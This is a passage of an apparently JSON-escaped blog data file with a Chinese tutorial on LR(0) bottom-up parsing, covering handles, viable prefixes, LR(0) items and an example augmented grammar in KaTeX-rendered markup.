style=\"margin-right:0.05724em;\">j</span></span></span></span>条规则，从stack中pop出<strong>与该规则右部字符串长度相同个数的字符</strong>；然后把规则左部的<strong>非终结字符</strong>push to stack，如果该非终结字符为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，则当前状态转换到分析表中<strong>当前状态</strong>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>所定位到的状态数。</li>\n<li>如果遇到分析表中的空值，则抛出一个error，分析出错。</li>\n<li>如果遇到<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>c</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">acc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">c</span></span></span></span>，分析结束。</li>\n</ul>\n<p>LR(0)的分析逻辑还算比较简单，但仍然有几个问题未解决：</p>\n<ol>\n<li>文法的活前缀是什么？</li>\n<li>如何得到文法活前缀的DFA？</li>\n<li>如何由DFA得到分析表？</li>\n</ol>\n<h3 id=\"文法的活前缀\"><a class=\"markdownIt-Anchor\" href=\"#文法的活前缀\"></a> 文法的活前缀</h3>\n<h4 id=\"前缀\"><a class=\"markdownIt-Anchor\" href=\"#前缀\"></a> 前缀</h4>\n<p>字符串的前缀是指字符串的任意首部。比如，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>b</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">abc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\">c</span></span></span></span>的前缀有：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi><mo separator=\"true\">,</mo><mtext>  </mtext><mi>a</mi><mo separator=\"true\">,</mo><mtext>  </mtext><mi>a</mi><mi>b</mi><mo separator=\"true\">,</mo><mtext>  </mtext><mi>a</mi><mi>b</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon,\\;a,\\;ab,\\;abc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">ϵ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\">c</span></span></span></span>。</p>\n<h4 id=\"规范句型的活前缀\"><a class=\"markdownIt-Anchor\" href=\"#规范句型的活前缀\"></a> 规范句型的活前缀</h4>\n<blockquote>\n<p>回溯学习：规范句型是什么?<br />\n用规范推导所推导出的句型称为规范句型。<br />\n回溯学习：什么是规范推导？<br />\n规范推导就是最右推导，这与自底向上分析法中<strong>最左规约</strong>是相对应的。</p>\n</blockquote>\n<p>而规范句型的活前缀，是指规范句型中、<strong>不包含句柄右边任何符号</strong>的前缀。</p>\n<blockquote>\n<p>回溯学习：句柄是什么？<br />\n句柄是一个句型的最左直接短语。</p>\n<p>那直接短语又是什么？</p>\n<p>假设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>是文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的一个句型，如果有</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>A</mi><mi>δ</mi><mo>∧</mo><mi>A</mi><mo>⇒</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A \\Rightarrow \\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>则称<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>是相对于非终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>的、句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>的一个直接短语。</p>\n</blockquote>\n<p>从LR分析法的定义也能看出，当所分析的输入串没有语法错误时，每时每刻的stack里的符号与剩余的输入符号串都能形成一个规范句型。<br />\n并且，如果stack中一旦存在<strong>句柄</strong>，那它立马就会被规约了，直到没有句柄为止。</p>\n<p>那就很明显了，实际上，stack中的字符就是<strong>规范句型的活前缀</strong>。那么，问题就转化为能不能将stack中的字符串识别为一个规范句型活前缀了。</p>\n<h4 id=\"lr0项目\"><a class=\"markdownIt-Anchor\" href=\"#lr0项目\"></a> LR(0)项目</h4>\n<p>由前文的活前缀定义，在一个规范句型的活前缀中，绝不含有句柄右边的任何符号，但仍然有可能含有或不含句柄的部分符号。因此会有三种情形：</p>\n<ol>\n<li>活前缀中已经含有句柄的全部字符。也就是说，某一规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>的右部已经出现在了stack顶端，此时应该进行规约。</li>\n<li>活前缀中只含有句柄的一部分字符。假如说存在一个规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><msub><mi>α</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha_1 \\alpha_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，那只有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>在stack顶端，需要继续输入字符。</li>\n<li>活前缀中完全没有任何句柄的符号，需要输入字符。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>LR分析法是比较麻烦的一种自底向上的分析方法。整体思路在于<strong>寻找句柄</strong>和<strong>最左规约</strong>。</p>\n<p>在分析字符串时，将待分析字符串从左至右push到stack中，一旦出现句柄，就规约。需要构造一个<strong>LR(0)分析表</strong></p>\n<h2 id=\"lr0分析法\"><a class=\"markdownIt-Anchor\" href=\"#lr0分析法\"></a> LR(0)分析法</h2>\n<h3 id=\"一个例子\"><a class=\"markdownIt-Anchor\" href=\"#一个例子\"></a> 一个例子</h3>\n<p>文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo stretchy=\"false\">[</mo><mi>S</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">G[S]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mopen\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose\">]</span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>E</mi><mo>→</mo><mi>a</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>E</mi><mo>→</mo><mi>b</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><mi>c</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>B</mi><mo>→</mo><mi>c</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>B</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;E\\rightarrow aA \\\\\n&amp;E\\rightarrow bB\\\\\n&amp;A\\rightarrow cA\\\\\n&amp;A\\rightarrow d\\\\\n&amp;B\\rightarrow cB\\\\\n&amp;B\\rightarrow d\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:9.000000000000002em;vertical-align:-4.250000000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.750000000000001em;\"><span style=\"top:-6.750000000000001em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-5.25em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.749999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.249999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.7499999999999996em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.7500000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.250000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.750000000000001em;\"><span style=\"top:-6.910000000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-5.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:-3.9099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span><span style=\"top:-0.9099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:0.5900000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.250000000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>把该文法托广：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>0.</mn><mtext>  </mtext><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><mi>E</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>1.</mn><mtext>  </mtext><mi>E</mi><mo>→</mo><mi>a</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>2.</mn><mtext>  </mtext><mi>E</mi><mo>→</mo><mi>b</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>3.</mn><mtext>  </mtext><mi>A</mi><mo>→</mo><mi>c</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>4.</mn><mtext>  </mtext><mi>A</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>5.</mn><mtext>  </mtext><mi>B</mi><mo>→</mo><mi>c</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>6.</mn><mtext>  </mtext><mi>B</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;0.\\;S^{&#x27;}\\rightarrow E\\\\\n&amp;1.\\;E\\rightarrow aA \\\\\n&amp;2.\\;E\\rightarrow bB\\\\\n&amp;3.\\;A\\rightarrow cA\\\\\n&amp;4.\\;A\\rightarrow d\\\\\n&amp;5.\\;B\\rightarrow cB\\\\\n&amp;6.\\;B\\rightarrow d\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:10.65248em;vertical-align:-5.076239999999999em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.57624em;\"><span style=\"top:-7.57624em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.07624em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.57624em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.0762400000000008em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.5762400000000008em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.07624000000000075em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.4237599999999992em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.076239999999999em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.57624em;\"><span style=\"top:-7.58376em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span></span></span><span style=\"top:-6.08376em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-4.583760000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:-3.0837600000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">3</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-1.5837600000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">4</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span><span style=\"top:-0.08376000000000072em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">5</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:1.4162399999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">6</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span 